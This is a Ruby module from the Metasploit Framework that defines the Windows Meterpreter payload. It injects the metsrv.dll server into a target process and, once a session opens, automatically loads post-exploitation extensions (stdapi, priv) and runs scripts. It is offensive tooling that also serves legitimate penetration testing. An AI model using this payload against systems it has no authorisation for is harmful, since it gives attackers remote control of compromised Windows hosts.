##
# $Id: meterpreter.rb 5853 2008-11-08 19:39:06Z egypt $
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##


require 'msf/core'
require 'msf/core/payload/windows/dllinject'
require 'msf/base/sessions/meterpreter'


###
#
# Injects the meterpreter server instance DLL via the DLL injection payload.
#
###
module Metasploit3

	include Msf::Payload::Windows::DllInject

	def initialize(info = {})
		super(update_info(info,
			'Name'          => 'Windows Meterpreter',
			'Version'       => '$Revision: 5853 $',
			'Description'   => 'Inject the meterpreter server DLL',
			'Author'        => 'skape',
			'License'       => MSF_LICENSE,
			'Session'       => Msf::Sessions::Meterpreter))

		sep = File::SEPARATOR

		# Override the DLL path with the path to the meterpreter server DLL
		register_options(
			[
				OptPath.new('DLL', 
					[ 
						true, 
						"The local path to the DLL to upload", 
						File.join(Msf::Config.install_root, "data", "meterpreter", "metsrv.dll")
					]),
			], self.class)

		# Set advanced options
		register_advanced_options(
			[
				OptBool.new('AutoLoadStdapi',
					[
						true,
						"Automatically load the Stdapi extension",
						true
					]),
				OptString.new('AutoRunScript', [false, "Script to autorun on meterpreter session creation", ''])
			], self.class)

		# Don't let people set the library name option
		options.remove_option('LibraryName')
	end

	#
	# The library name that we're injecting the DLL as has to be metsrv.dll for
	# extensions to make use of.
	#
	def library_name
		"metsrv.dll"
	end

	#
	# Once a session is created, automatically load the stdapi extension if the
	# advanced option is set to true.
	#
	def on_session(session)
		super
		if (datastore['AutoLoadStdapi'] == true)
			session.load_stdapi 
			if (framework.exploits.create(session.via_exploit).privileged?)
				session.load_priv 
			end
		end
		if (datastore['AutoRunScript'].empty? == false)
			client = session
			args = datastore['AutoRunScript'].split
			session.execute_script(args.shift, binding)
		end
	end

end
